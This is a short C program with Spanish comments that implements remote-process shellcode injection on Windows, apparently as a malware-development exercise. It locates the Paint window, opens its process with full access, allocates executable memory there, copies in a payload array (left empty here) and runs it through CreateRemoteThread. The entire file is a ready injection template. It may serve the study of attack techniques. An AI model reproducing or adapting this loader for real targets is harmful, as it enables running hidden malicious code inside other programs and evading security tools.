#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Representará el payload a inyectar
unsigned char my_payload[] = "";

int main()
{	
	// Descriptores para el proceso y el hilo remoto
	HANDLE  ph;
	HANDLE  rt;
	// Identificador del proceso 
	DWORD  pid;

	// Handle de la ventana objetivo
	// FindWindow busca una ventana con dicho titulo
	HWND	hw = FindWindow(NULL, (LPCSTR)"Untitled - Paint");
	if (hw == NULL)
	{
		printf("failed to find window :( \n");
		return -2;
	}
	// Obtenemmos el PID del proceso asociado con la ventana encontrada y lo almacena en pid
	GetWindowThreadProcessId(hw, &pid);
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL);

	rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
	CloseHandle(ph);

	return 0;
}